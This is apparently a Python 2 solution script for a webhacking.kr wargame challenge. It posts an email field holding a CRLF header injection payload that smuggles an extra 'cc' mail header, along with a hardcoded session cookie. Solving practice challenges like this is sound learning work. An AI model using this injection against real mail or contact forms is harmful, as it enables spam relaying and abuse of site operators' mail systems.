import urllib
import httplib
import hashlib

HTTP=httplib.HTTPConnection("webhacking.kr")
Param="email=st4rburst@naver.com%0d%0acc:%20st4rburst@naver.com"
Headers={"Content-Type":"application/x-www-form-urlencoded",
         "Cookie":"PHPSESSID=bc4730b877a0174a3eef0f693c329912;"}
HTTP.request("POST","/challenge/bonus/bonus-11/index.php",Param,Headers)
Result=HTTP.getresponse().read()
print Result
